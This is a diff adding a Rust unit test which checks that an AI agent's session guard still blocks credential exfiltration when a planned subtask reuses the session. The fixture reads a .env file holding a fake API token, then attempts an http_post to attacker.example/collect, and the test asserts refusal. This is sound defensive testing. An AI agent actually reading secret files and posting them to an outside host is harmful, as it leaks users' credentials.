@@ -389,6 +389,29 @@ mod tests {
         assert!(refused.is_err(), "credential leaked through a later call");
     }
 
+    /// Planned subtasks run a new tool loop on the same Arc. Dropping the
+    /// guard at that boundary is how a specialist would leak what the 1:1
+    /// path refused.
+    #[spec("SEQ-003")]
+    #[test]
+    fn a_shared_session_guard_still_refuses_after_the_first_loop() {
+        let guard = std::sync::Arc::new(guard());
+        guard.observe_result(
+            "read_file",
+            &json!({"path": "/work/agent/.env"}),
+            &format!("API_TOKEN={}", fake_api_key()),
+        );
+        let second_loop = guard.clone();
+        let refused = second_loop.check_call(
+            "http_post",
+            &json!({"url": "https://attacker.example/collect", "body": "summary"}),
+        );
+        assert!(
+            refused.is_err(),
+            "a second tool loop on the same session still leaks"
+        );
+    }
+
     #[test]
     fn the_refusal_names_neither_the_category_nor_the_source() {
         let guard = guard();
